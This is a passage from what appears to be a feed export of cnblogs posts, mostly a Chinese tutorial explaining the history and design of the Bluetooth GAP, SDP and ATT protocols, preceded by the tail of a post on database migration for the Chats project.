时请务必先备份数据库，并手动执行迁移脚本：</p>\n<ul>\n<li>1.8.0：<code>src/scripts/db-migration/1.8/1.8.0.sql</code></li>\n<li>1.8.1：<code>src/scripts/db-migration/1.8/1.8.1.sql</code>（清理 Azure AI Foundry 的 Host 参数）</li>\n</ul>\n<p>如果你用的是 SQLite/Postgres……老规矩：把脚本丢给 AI 先改，再边跑边修；或者能接受删库的话，让 Chats 启动时自动建新表结构也行。</p>\n<hr />\n<p>感谢大家的阅读！喜欢的朋友请给我的Github项目一个star：<a href=\"https://github.com/sdcb/chats\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/sdcb/chats</a><br />\n如果你好奇的话，这是完整的更新日志：<a href=\"https://github.com/sdcb/chats/blob/main/doc/zh-CN/release-notes/README.md\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/sdcb/chats/blob/main/doc/zh-CN/release-notes/README.md</a><br />\n有什么想法也欢迎在评论区留言交流，也欢迎加入我的 Chats微信群：<br />\n<img alt=\"\" src=\"https://io.starworks.cc:88/cv-public/2026/chats-wxg-qr.png\" /></p>\n<p>（如果你更喜欢用QQ，可以用QQ群：<strong>498452653</strong>）我们一起探索更多AI技术硬核玩法。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 08:45</span>&nbsp;\n<a href=\"https://www.cnblogs.com/sdcb\">.NET骚操作</a>&nbsp;\n阅读(<span id=\"post_view_count\">315</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "蓝牙基础(九)：详解蓝牙 GAP、SDP、ATT、GATT 的历史背景与设计哲学",
      "link": "https://www.cnblogs.com/liwen01/p/19492724",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/liwen01/p/19492724\" id=\"cb_post_title_url\" title=\"发布于 2026-01-20 08:42\">\n    <span>蓝牙基础(九)：详解蓝牙 GAP、SDP、ATT、GATT 的历史背景与设计哲学</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p class=\"js_darkmode__1\"><strong class=\"js_darkmode__2\">liwen01 2026.01.01</strong></p>\n<h2 class=\"js_darkmode__3\"><span class=\"js_darkmode__4\">前言</span></h2>\n<p class=\"js_darkmode__5\">我们现在使用的蓝牙，它不是一蹴而就的，它经历了从<strong class=\"js_darkmode__6\">电缆替代者</strong>（经典蓝牙）到&nbsp;<strong class=\"js_darkmode__7\">万物互联基石</strong>（低功耗蓝牙）的演变。</p>\n<p class=\"js_darkmode__8\">要理解&nbsp;<code class=\"js_darkmode__9\">SDP</code>、<code class=\"js_darkmode__10\">GAP</code>、<code class=\"js_darkmode__11\">ATT</code>、<code class=\"js_darkmode__12\">GATT</code>&nbsp;这些类似重叠的协议，需要回到蓝牙技术发展的历史背景和设计哲学。</p>\n<h2 class=\"js_darkmode__13\"><span class=\"js_darkmode__14\">（一）历史背景</span></h2>\n<h3 class=\"js_darkmode__15\"><span class=\"js_darkmode__16\">（1）早期无线通信的春秋战国</span></h3>\n<p class=\"js_darkmode__17\">在蓝牙标准诞生之初，不同厂家对<strong class=\"js_darkmode__18\">如何发现对方</strong>、<strong class=\"js_darkmode__19\">如何加密</strong>、<strong class=\"js_darkmode__20\">如何连接</strong>有不同的理解。如果没有一个统一的框架，A 厂家的手机可能根本搜不到 B 厂家的耳机。</p>\n<p class=\"js_darkmode__21\"><strong class=\"js_darkmode__22\">GAP</strong>&nbsp;(Generic Access Profile) 的存在是为了定义<strong class=\"js_darkmode__23\">通用的行为准则</strong>，设计目的有两个：</p>\n<p class=\"js_darkmode__24\"><strong class=\"js_darkmode__25\">（A）标准化流程</strong>：它规定了所有蓝牙设备必须如何打招呼（广播）、如何交换名片（发现）以及如何建立外交关系（连接）。</p>\n<p class=\"js_darkmode__26\"><strong class=\"js_darkmode__27\">（B）解耦</strong>：它让上层应用不需要关心底层的物理跳频或链路层状态转换，只需知道自己是<strong class=\"js_darkmode__28\">中心设备</strong>（Central）还是&nbsp;<strong class=\"js_darkmode__29\">外围设备</strong>（Peripheral）。</p>\n<h3 class=\"js_darkmode__30\"><span class=\"js_darkmode__31\">（2）解决经典蓝牙业务繁杂问题</span></h3>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161205390-1764873844.png\" />\n<p class=\"js_darkmode__33\">经典蓝牙（BR/EDR）的设计初衷是取代各种电缆（串口线、打印线、耳机线）。</p>\n<p class=\"js_darkmode__34\">因此，它承载了非常多的特定协议（Profiles），如 HFP（通话）、A2DP（音乐）、SPP（串口）。</p>\n<p class=\"js_darkmode__35\"><strong class=\"js_darkmode__36\">SDP</strong>&nbsp;(Service Discovery Protocol) 就是蓝牙世界里的<strong class=\"js_darkmode__37\">黄页服务</strong>，设计目的也有两个：</p>\n<p class=\"js_darkmode__38\"><strong class=\"js_darkmode__39\">（A）动态查询：</strong>&nbsp;经典蓝牙设备通常功能复杂，当手机连接音箱时，它不知道这个音箱是否带麦克风（HFP），也不知其音质等级（A2DP）。</p>\n<p class=\"js_darkmode__40\"><strong class=\"js_darkmode__41\">（B）按需建立：</strong>&nbsp;通过 SDP，设备可以先查询对方支持哪些服务，获取连接这些服务所需的<strong class=\"js_darkmode__42\">端口号</strong>（如 RFCOMM 通道），然后再建立真正的业务连接，节省了系统资源。</p>\n<h3 class=\"js_darkmode__43\"><span class=\"js_darkmode__44\">（3）解决BLE极致功耗问题</span></h3>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161608250-1350751949.png\" />\n<p class=\"js_darkmode__46\">2010年左右，蓝牙 4.0 (BLE) 问世。此时的设计目标变了：不再是传输高带宽的音频，而是传输极小的数据（如温度、心率），且要求一颗纽扣电池能用一年。</p>\n<p class=\"js_darkmode__47\">经典蓝牙的协议栈（包括 SDP）对于这些小传感器来说太重、太费电了。</p>\n<p class=\"js_darkmode__48\"><strong class=\"js_darkmode__49\">为了极致省电，蓝牙设计者提出了 ATT 和 GATT 的组合：</strong></p>\n<p class=\"js_darkmode__50\">传感器数据通常非常简单（就是一个数值），比如温度湿度传感器。</p>\n<p class=\"js_darkmode__51\"><strong class=\"js_darkmode__52\">（A）ATT (Attribute Protocol)：极简的搬运工</strong></p>\n<p class=\"js_darkmode__53\"><strong class=\"js_darkmode__54\">ATT</strong>&nbsp;弃了复杂的握手，将所有数据简化为<strong class=\"js_darkmode__55\">属性（Attribute）</strong>。它只负责最简单的操作：读、写、通知。它像是一个高效的仓库搬运工，只认<strong class=\"js_darkmode__56\">货架号（Handle）</strong>，不问数据背后的逻辑。</p>\n<p class=\"js_darkmode__57\">但是ATT的属性（Attribute）太底层了，一堆 handle 很难管理，所以就有了GATT 。</p>\n<p class=\"js_darkmode__58\"><strong class=\"js_darkmode__59\">（B）GATT (Generic Attribute Profile)：逻辑的架构师</strong></p>\n<p class=\"js_darkmode__60\"><strong class=\"js_darkmode__61\">GATT</strong>&nbsp;的目的是在 ATT 之上建立了一套层级结构（Service &gt; Characteristic），把 ATT 相关的属性打包。</p>\n<p class=\"js_darkmode__62\">GATT 是声明式的，它不需要像 SDP 那样进行复杂的动态交互，而是通过简单的属性列表直接告诉对方：<strong class=\"js_darkmode__63\">我的 0x0012 货架放的是心率数据</strong></p>\n<h2 class=\"js_darkmode__64\"><span class=\"js_darkmode__65\">（二）GAP（Generic Access Profile）</span></h2>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161618653-435478667.png\" />\n<p class=\"js_darkmode__67\"><strong class=\"js_darkmode__68\">GAP</strong>（Generic Access Profile，通用访问配置文件）是蓝牙协议栈中最基础、最重要的配置文件之一。</p>\n<p class=\"js_darkmode__69\">可以把它看做是蓝牙设备的<strong class=\"js_darkmode__70\">身份证</strong>和<strong class=\"js_darkmode__71\">外交官</strong>。它定义了设备如何互相发现、建立连接以及确保基本的互操作性。</p>\n<h3 class=\"js_darkmode__72\"><span class=\"js_darkmode__73\">（1）GAP 的核心作用</span></h3>\n<p class=\"js_darkmode__74\">为确保不同厂商的设备能够互相发现并建立连接，GAP 的核心作用有4个：</p>\n<p class=\"js_darkmode__75\"><strong class=\"js_darkmode__76\">（A）模式与过程 (Modes and Procedures)：</strong>&nbsp;设备如何被发现（广播）以及如何发现别人（扫描）。</p>\n<p class=\"js_darkmode__77\"><strong class=\"js_darkmode__78\">（B）角色 (Roles)：</strong>&nbsp;定义设备在蓝牙网络中的身份（如手机是 Central，手环是 Peripheral）。</p>\n<p class=\"js_darkmode__79\"><strong class=\"js_darkmode__80\">（C）安全 (Security)：</strong>&nbsp;定义安全级别和配对模式的基础。</p>\n<p class=\"js_darkmode__81\"><strong class=\"js_darkmode__82\">（D）数据格式 (Data Formats)：</strong>&nbsp;定义广播数据和扫描响应数据的通用格式。</p>\n<h3 class=\"js_darkmode__83\"><span class=\"js_darkmode__84\">（2）GAP 四大核心角色(Roles)</span></h3>\n<p class=\"js_darkmode__85\">在连接建立之前，GAP 首先定义了设备在链路层表现出的<strong class=\"js_darkmode__86\">身份</strong>。这决定了谁负责发信号，谁负责找信号。</p>\n<p class=\"js_darkmode__87\">在低功耗蓝牙 (BLE) 中，GAP 定义了四种特定的角色。这些角色决定了链路层 (Link Layer) 的状态。</p>\n<p class=\"js_darkmode__88\"><strong class=\"js_darkmode__89\">（A）Broadcaster（广播者）：</strong>&nbsp;仅发送广播数据，<strong class=\"js_darkmode__90\">不支持</strong>建立连接，比如：温度传感器、Beacon。此时链路层处于 Advertising State 状态。</p>\n<p class=\"js_darkmode__91\"><strong class=\"js_darkmode__92\">（B）Observer（观察者）：</strong>&nbsp;仅扫描广播数据，<strong class=\"js_darkmode__93\">不支持</strong>发起连接，比如：仅用于数据采集的网关，此时链路层处于 Scanning State 状态。</p>\n<p class=\"js_darkmode__94\"><strong class=\"js_darkmode__95\">（C）Peripheral（外设）：</strong>&nbsp;发送广播，<strong class=\"js_darkmode__96\">支持</strong>被连接。通常是数据提供方，通常是性能受限、对功耗敏感的设备，比如：智能手环、心率带、智能锁。</p>\n<p class=\"js_darkmode__97\">此时链路层处于Advertising / Connection (Slave) 状态</p>\n<p class=\"js_darkmode__98\"><strong class=\"js_darkmode__99\">（D）Central（中心设备）：</strong>&nbsp;扫描广播，<strong class=\"js_darkmode__100\">发起</strong>连接。通常是控制方和数据处理方,一般拥有更强处理能力和电量的设备,比如：智能手机、平板电脑。</p>\n<p class=\"js_darkmode__101\">此时链路层处于Scanning / Connection (Master) 状态</p>\n<p class=\"js_darkmode__102\"><strong class=\"js_darkmode__103\">注意</strong>： 一个设备可以在不同时间切换不同角色，甚至在 V5.x 中通过多重连接拓扑同时扮演不同角色。</p>\n<h3 class=\"js_darkmode__104\"><span class=\"js_darkmode__105\">（3）GAP 的操作模式、过程、连接参数</span></h3>\n<p class=\"js_darkmode__106\"><strong class=\"js_darkmode__107\">（A）发现模式 (Discoverability Modes)</strong>&nbsp;:有三种发现模式：</p>\n<p class=\"js_darkmode__108\"><strong class=\"js_darkmode__109\">不可被发现模式 (Non-Discoverable Mode)：</strong>&nbsp;设备不发送广播，或者发送的广播不支持被发现（仅用于维持现有连接或广播特定非发现数据）。</p>\n<p class=\"js_darkmode__110\"><strong class=\"js_darkmode__111\">有限可发现模式 (Limited Discoverable Mode)：</strong>&nbsp;设备在短时间内（通常有超时限制）可被发现。常用于按下按钮后的配对状态。</p>\n<p class=\"js_darkmode__112\"><strong class=\"js_darkmode__113\">一般可发现模式 (General Discoverable Mode)：</strong>&nbsp;设备在很长一段时间内都可以被发现。这是大多数消费电子产品的默认状态。</p>\n<p class=\"js_darkmode__114\"><strong class=\"js_darkmode__115\">（B）连接模式 (Connectability Modes)</strong>&nbsp;有三种:</p>\n<p class=\"js_darkmode__116\"><strong class=\"js_darkmode__117\">不可连接 (Non-Connectable)：</strong>&nbsp;仅广播数据，拒绝连接请求。</p>\n<p class=\"js_darkmode__118\"><strong class=\"js_darkmode__119\">定向可连接 (Directed Connectable)：</strong>&nbsp;仅接受来自特定（已绑定）设备的连接请求，用于快速重连。</p>\n<p class=\"js_darkmode__120\"><strong class=\"js_darkmode__121\">无向可连接 (Undirected Connectable)：</strong>&nbsp;接受任何设备的连接请求。</p>\n<p class=\"js_darkmode__122\"><strong class=\"js_darkmode__123\">（C）发现过程 (Discovery Procedures)</strong></p>\n<p class=\"js_darkmode__124\">作为中心设备（Central）或观察者（Observer），GAP 定义了如何去发现周围设备：</p>\n<p class=\"js_darkmode__125\"><strong class=\"js_darkmode__126\">有限发现过程 (Limited Discovery Procedure)：</strong>&nbsp;仅过滤并显示处于<strong class=\"js_darkmode__127\">有限可发现模式</strong>的设备。</p>\n<p class=\"js_darkmode__128\"><strong class=\"js_darkmode__129\">一般发现过程 (General Discovery Procedure)：</strong>&nbsp;发现所有可发现的设备。</p>\n<p class=\"js_darkmode__130\"><strong class=\"js_darkmode__131\">（D）连接参数 (Connection Parameters)</strong></p>\n<p class=\"js_darkmode__132\">在 GAP 中，定义了中心设备和外围设备建立连接时必须协商的关键参数。这些参数直接影响<strong class=\"js_darkmode__133\">功耗</strong>和<strong class=\"js_darkmode__134\">数据吞吐量</strong>。</p>\n<p class=\"js_darkmode__135\"><strong class=\"js_darkmode__136\">连接间隔 (Connection Interval)：</strong>&nbsp;两次通信之间的时间间隔（7.5ms ~ 4.0s）。</p>\n<p class=\"js_darkmode__137\">间隔越短，速度越快但耗电；间隔越长，越省电。</p>\n<p class=\"js_darkmode__138\"><strong class=\"js_darkmode__139\">外围设备延迟 (Peripheral Latency/Slave Latency)：</strong>&nbsp;允许外围设备在没有数据发送时跳过连接事件的次数。这对低功耗至关重要。</p>\n<p class=\"js_darkmode__140\"><strong class=\"js_darkmode__141\">监督超时 (Supervision Timeout)：</strong>&nbsp;如果超过这个时间没有通信，连接被视为断开。</p>\n<p class=\"js_darkmode__142\">在蓝牙 5.3 引入了 Connection Subrating (连接子速率)，虽然这主要是链路层的功能，</p>\n<p class=\"js_darkmode__143\">但在 GAP 层面，它允许设备在保持低占空比（省电）的同时，能够更快速地切换到高占空比（高性能）模式，而无需完全重新协商连接参数。</p>\n<h3 class=\"js_darkmode__144\"><span class=\"js_darkmode__145\">（4）GAP 与底层（Link Layer）的协调逻辑</span></h3>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161632014-1638310985.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__147\">在架构图中，GAP 位于&nbsp;<strong class=\"js_darkmode__148\">L2CAP</strong>&nbsp;和&nbsp;<strong class=\"js_darkmode__149\">Link Layer (LL)</strong>&nbsp;之上。它的管理指令是自上而下下达的：</p>\n<p class=\"js_darkmode__150\"><strong class=\"js_darkmode__151\">GAP 发指令：</strong>&nbsp;应用层告诉 GAP&nbsp;<strong class=\"js_darkmode__152\">我要连接那台名为 'Apple Watch' 的设备</strong>。</p>\n<p class=\"js_darkmode__153\"><strong class=\"js_darkmode__154\">GAP 调度：</strong>&nbsp;GAP 检查当前配置，并命令 Link Layer 进入&nbsp;<strong class=\"js_darkmode__155\">Initiating State（发起状态）</strong>。</p>\n<p class=\"js_darkmode__156\"><strong class=\"js_darkmode__157\">LL 执行：</strong>&nbsp;Link Layer 在空中监听对方的广播包，并在极短的窗口期内完成握手。</p>\n<p class=\"js_darkmode__158\"><strong class=\"js_darkmode__159\">GAP 反馈：</strong>&nbsp;连接成功后，GAP 会通知上层（如 GATT 或应用层）：<strong class=\"js_darkmode__160\">链路已建立，可以开始传输数据了</strong>。</p>\n<h3 class=\"js_darkmode__161\"><span class=\"js_darkmode__162\">（5）为什么手环设备能省电</span></h3>\n<p class=\"js_darkmode__163\">这里我们以蓝牙手环来举例，从手环的初始化、连接、进入静默期、调整 这个周期来看它是如何进行功耗管理的。</p>\n<p class=\"js_darkmode__164\"><strong class=\"js_darkmode__165\">初始化：</strong>&nbsp;手环 GAP 设置为&nbsp;<strong class=\"js_darkmode__166\">Peripheral</strong>，每 1 秒发一次广播。</p>\n<p class=\"js_darkmode__167\"><strong class=\"js_darkmode__168\">连接：</strong>&nbsp;手机&nbsp;<strong class=\"js_darkmode__169\">Central</strong>&nbsp;发现手环，GAP 建立连接，初始连接间隔设为&nbsp;<strong class=\"js_darkmode__170\">30ms</strong>（为了快速同步数据）。</p>\n<p class=\"js_darkmode__171\"><strong class=\"js_darkmode__172\">进入静默期：</strong>&nbsp;数据同步完了，App 进入后台。此时手机 GAP 发起<strong class=\"js_darkmode__173\">连接参数更新请求</strong>。</p>\n<p class=\"js_darkmode__174\"><strong class=\"js_darkmode__175\">调整：</strong>&nbsp;连接间隔被拉长到&nbsp;<strong class=\"js_darkmode__176\">500ms</strong>，且设置了&nbsp;<strong class=\"js_darkmode__177\">Slave Latency = 10</strong>。这意味着手环即使每 500ms 该醒来一次，但如果没数据，它可以连续<strong class=\"js_darkmode__178\">睡</strong>&nbsp;10 次，也就是 5 秒钟才跟手机通信一次。</p>\n<p class=\"js_darkmode__179\">结果就是：这种由 GAP 协调的参数调整，让你的手环续航从 3 天延长到了 20 天。</p>\n<h2 class=\"js_darkmode__180\"><span class=\"js_darkmode__181\">（三）SDP (Service Discovery Protocol)</span></h2>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161648229-1416782711.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__183\"><strong class=\"js_darkmode__184\">SDP</strong>&nbsp;(Service Discovery Protocol) 是 金典蓝牙(BR/EDR)设备的&nbsp;<strong class=\"js_darkmode__185\">黄页电话簿</strong>。</p>\n<p class=\"js_darkmode__186\">在两个<strong class=\"js_darkmode__187\">金典蓝牙</strong>设备建立连接后，必须通过 SDP 来查询对方：<strong class=\"js_darkmode__188\">你到底支持哪些功能？怎么连接这些功能？</strong></p>\n<h3 class=\"js_darkmode__189\"><span class=\"js_darkmode__190\">（1）SDP 的核心概念与适用范围</span></h3>\n<p class=\"js_darkmode__191\">SDP 提供了一种机制，允许客户端应用程序发现服务器应用程序提供的服务以及这些服务的属性。</p>\n<p class=\"js_darkmode__192\">它不定义具体的服务操作（那是各个 Profile 的事），只负责发现。</p>\n<p class=\"js_darkmode__193\"><strong class=\"js_darkmode__194\">重要前提</strong>： SDP 主要用于 蓝牙经典 (BR/EDR) 技术，虽然 BLE 设备主要用 GATT，但双模设备（Dual Mode，同时支持 Classic 和 BLE）依然必须实现 SDP 栈以支持经典蓝牙部分的功能。</p>\n<h3 class=\"js_darkmode__195\"><span class=\"js_darkmode__196\">（2）SDP 架构与角色 (Architecture &amp; Roles)</span></h3>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161702037-464956041.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__198\">SDP 采用简单的&nbsp;<strong class=\"js_darkmode__199\">Client-Server (客户端-服务器)</strong>&nbsp;模型：</p>\n<p class=\"js_darkmode__200\"><strong class=\"js_darkmode__201\">SDP Server (服务端)：</strong>&nbsp;通常是提供服务的设备（如蓝牙音箱），它维护一个服务记录数据库。</p>\n<p class=\"js_darkmode__202\"><strong class=\"js_darkmode__203\">SDP Client (客户端)：</strong>&nbsp;通常是想要使用服务的设备（如手机），它向服务端发起查询。</p>\n<p class=\"js_darkmode__204\">常见的查询方式有：</p>\n<p class=\"js_darkmode__205\"><strong class=\"js_darkmode__206\">服务搜索 (Service Search)：</strong>&nbsp;客户端问：你这里有支持 UUID 为 0x110B（音频接收）的服务吗？</p>\n<p class=\"js_darkmode__207\"><strong class=\"js_darkmode__208\">属性获取 (Service Attribute)：</strong>&nbsp;客户端问：对于这个音频服务，你的连接通道是多少？</p>\n<p class=\"js_darkmode__209\"><strong class=\"js_darkmode__210\">服务浏览 (Service Browsing)：</strong>&nbsp;客户端请求查看服务器上所有可公开的服务列表。</p>\n<h3 class=\"js_darkmode__211\"><span class=\"js_darkmode__212\">（3）SDP 的核心组件、数据模型</span></h3>\n<p class=\"js_darkmode__213\">SDP 服务器维护的数据库由一系列 Service Records (服务记录) 组成。</p>\n<p class=\"js_darkmode__214\"><strong class=\"js_darkmode__215\">（1）Service Record (服务记录)</strong></p>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161715276-1451476449.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__217\"><strong class=\"js_darkmode__218\">Service Record Handle:</strong>&nbsp; 每一个服务（如<strong class=\"js_darkmode__219\">免提通话</strong>、<strong class=\"js_darkmode__220\">串口通信</strong>）都对应一条记录，这是 SDP 服务器分配给某一个服务的索引号。</p>\n<p class=\"js_darkmode__221\">在一台设备（Server）上，每一个服务记录都有一个唯一的句柄，长度为32位，称为 Handle。</p>\n<p class=\"js_darkmode__222\"><strong class=\"js_darkmode__223\">分配规则</strong>： 范围是 0x00000000 到 0xFFFFFFFF。通常 0x00000000 是保留给 SDP 服务本身的。</p>\n<p class=\"js_darkmode__224\"><strong class=\"js_darkmode__225\">（2）Service Attributes (服务属性)</strong></p>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161727144-2105630239.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__227\">每条记录包含多个属性，描述该服务的细节。属性由&nbsp;<strong class=\"js_darkmode__228\">Attribute ID</strong>&nbsp;和&nbsp;<strong class=\"js_darkmode__229\">Attribute Value</strong>&nbsp;组成。</p>\n<p class=\"js_darkmode__230\"><strong class=\"js_darkmode__231\">Attribute ID</strong>&nbsp; (属性 ID)： 定义了该属性的含义，由蓝牙 SIG 统一规定，例如：</p>\n<ul class=\"list-paddingleft-1 js_darkmode__232\">\n<li><code class=\"js_darkmode__234\">0x0001</code>：始终代表&nbsp;<code class=\"js_darkmode__235\">ServiceClassIDList</code>（服务类别列表）。</li>\n<li><code class=\"js_darkmode__237\">0x0100</code>：始终代表&nbsp;<code class=\"js_darkmode__238\">ServiceName</code>（服务名称）。</li>\n</ul>\n<p class=\"js_darkmode__239\">客户端通过这个 ID 告诉服务器：请把这个服务的 ServiceName（0x0100） 告诉我。</p>\n<p class=\"js_darkmode__240\"><strong class=\"js_darkmode__241\">Attribute Value</strong>&nbsp;(属性值) ： 这是最具体的数据，它的格式叫 Data Element，可以是一个整数、一个字符串、一个布尔值，甚至是一个嵌套的列表。</p>\n<p class=\"js_darkmode__242\"><strong class=\"js_darkmode__243\">（3）UUID (通用唯一标识符)</strong></p>\n<p class=\"js_darkmode__244\">UUID 这是 SDP 的灵魂，它是一个全球唯一的标签，用来标识<strong class=\"js_darkmode__245\">这就是 A2DP 音频</strong>或<strong class=\"js_darkmode__246\">这就是串口协议</strong>。</p>\n<p class=\"js_darkmode__247\"><strong class=\"js_darkmode__248\">关键点</strong>： UUID 通常是作为<strong class=\"js_darkmode__249\">Attribute Value</strong>的一部分出现的。</p>\n<p class=\"js_darkmode__250\">比如在&nbsp;<code class=\"js_darkmode__251\">ServiceClassIDList</code>&nbsp;这个属性（ID 为&nbsp;<code class=\"js_darkmode__252\">0x0001</code>）里，它的值通常就是一个 UUID（如&nbsp;<code class=\"js_darkmode__253\">0x110B</code>&nbsp;代表 A2DP Audio Sink）。</p>\n<p class=\"js_darkmode__254\">一般16位 UUID（简短版）用于官方标准服务，128位 UUID（完整版）用于厂商自定义服务。</p>\n<p class=\"js_darkmode__255\"><strong class=\"js_darkmode__256\">（4）Handle、Attribute ID、Value、UUID 的区别</strong></p>\n<p class=\"js_darkmode__257\"><strong class=\"js_darkmode__258\">Handle</strong>&nbsp;(32位)<strong class=\"js_darkmode__259\">：</strong>找到那个服务记录的钥匙。</p>\n<p class=\"js_darkmode__260\"><strong class=\"js_darkmode__261\">Attribute ID</strong>&nbsp;(16位)：指明你想看记录里的哪一项。</p>\n<p class=\"js_darkmode__262\"><strong class=\"js_darkmode__263\">Attribute Value</strong>：那一项里存的实际数据。</p>\n<p class=\"js_darkmode__264\"><strong class=\"js_darkmode__265\">UUID</strong>：存在数据里的<strong class=\"js_darkmode__266\">标准身份标签</strong>。</p>\n<h3 class=\"js_darkmode__267\"><span class=\"js_darkmode__268\">（4）SDP 协议过程 (Protocol Procedures)</span></h3>\n<p class=\"js_darkmode__269\">SDP 定义了三种主要的 PDU (协议数据单元) 交互模式，运行在 L2CAP 协议之上（通常使用 PSM&nbsp;<code class=\"js_darkmode__270\">0x0001</code>）。</p>\n<p class=\"js_darkmode__271\"><strong class=\"js_darkmode__272\">（A）Service Search Transaction (服务搜索)</strong></p>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161746937-210164031.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__274\"><strong class=\"js_darkmode__275\">Client 问:</strong>&nbsp;你有支持 UUID 为&nbsp;<code class=\"js_darkmode__276\">0x1101</code>&nbsp;(Serial Port) 的服务吗？</p>\n<p class=\"js_darkmode__277\"><strong class=\"js_darkmode__278\">Server 答:</strong>&nbsp;有，对应的 Service Record Handle 是&nbsp;<code class=\"js_darkmode__279\">0x00010005</code>。</p>\n<p class=\"js_darkmode__280\"><strong class=\"js_darkmode__281\">用途:</strong>&nbsp;仅获取记录的句柄，不获取具体细节。</p>\n<p class=\"js_darkmode__282\"><strong class=\"js_darkmode__283\">（B）Service Attribute Transaction (属性获取)</strong></p>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161807388-333043667.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__285\"><strong class=\"js_darkmode__286\">Client 问:</strong>&nbsp;请给我 Handle 为&nbsp;<code class=\"js_darkmode__287\">0x00010005</code>&nbsp;的所有属性（或者特定属性，如协议列表）。</p>\n<p class=\"js_darkmode__288\"><strong class=\"js_darkmode__289\">Server 答:</strong>&nbsp;这是属性列表：ID&nbsp;<code class=\"js_darkmode__290\">0x0001</code>&nbsp;是...，ID&nbsp;<code class=\"js_darkmode__291\">0x0004</code>&nbsp;是...</p>\n<p class=\"js_darkmode__292\"><strong class=\"js_darkmode__293\">用途:</strong>&nbsp;已知句柄，获取详细信息。</p>\n<p class=\"js_darkmode__294\"><strong class=\"js_darkmode__295\">（C）Service Search Attribute Transaction (搜索并获取)</strong></p>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161820643-1809280923.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__297\"><strong class=\"js_darkmode__298\">Client 问:</strong>&nbsp;查找支持 UUID&nbsp;<code class=\"js_darkmode__299\">0x1101</code>&nbsp;的服务，并直接把它们的协议列表属性发给我。</p>\n<p class=\"js_darkmode__300\"><strong class=\"js_darkmode__301\">Server 答:</strong>&nbsp;找到了，这是数据...</p>\n<p class=\"js_darkmode__302\"><strong class=\"js_darkmode__303\">用途:</strong>&nbsp;<strong class=\"js_darkmode__304\">最高效的方式</strong>，一次交互完成搜索和读取，减少空中交互时间。</p>\n<h2 class=\"js_darkmode__305\"><span class=\"js_darkmode__306\">（四）ATT (Attribute Protocol)</span></h2>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161831665-1799709478.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__308\"><strong class=\"js_darkmode__309\">ATT</strong>&nbsp;(Attribute Protocol) 是蓝牙低功耗 (BLE) 世界的&nbsp;<strong class=\"js_darkmode__310\">搬运工</strong>。它是 BLE 通信的最底层数据传输协议。</p>\n<p class=\"js_darkmode__311\">上层的 GATT (Generic Attribute Profile) 几乎所有的操作（读、写、通知）都是通过 ATT 协议定义的 PDU (协议数据单元) 来完成的。</p>\n<h3 class=\"js_darkmode__312\"><span class=\"js_darkmode__313\">（1）ATT 的核心架构与角色</span></h3>\n<p class=\"js_darkmode__314\">ATT 定义了两个核心角色，这两个角色完全独立于 GAP 的<strong class=\"js_darkmode__315\">主机/从机</strong>或<strong class=\"js_darkmode__316\">中心/外围</strong>角色。</p>\n<p class=\"js_darkmode__317\"><strong class=\"js_darkmode__318\">服务器 (Server):</strong>:数据持有者,它存储了所有的状态、数据和配置信息（即<strong class=\"js_darkmode__319\">属性</strong>）。它通常是传感器设备（如心率带、温度计）。</p>\n<p class=\"js_darkmode__320\"><strong class=\"js_darkmode__321\">注意</strong>：在大多数情况下，BLE 外围设备 (Peripheral) 充当 ATT Server，但这并不是强制的。</p>\n<p class=\"js_darkmode__322\"><strong class=\"js_darkmode__323\">客户端</strong>&nbsp;(Client)：数据请求者，它向服务器发起请求，或者接收服务器推送的数据。通常是手机、网关或平板电脑。</p>\n<h3 class=\"js_darkmode__324\"><span class=\"js_darkmode__325\">（2）ATT 的属性（数据单元）</span></h3>\n<p class=\"js_darkmode__326\">ATT 层传输的最小单位就是&nbsp;<strong class=\"js_darkmode__327\">Attribute</strong>&nbsp;(属性)。服务器本质上就是一个巨大的属性列表（Attribute Table）。每一个属性都由以下四个元素组成：</p>\n<p class=\"js_darkmode__328\"><strong class=\"js_darkmode__329\">Attribute Handle</strong>：handle 长度16bit，它是属性的<strong class=\"js_darkmode__330\">地址</strong>或索引。客户端通过句柄来找到它要读写的数据。范围：0x0001 ~ 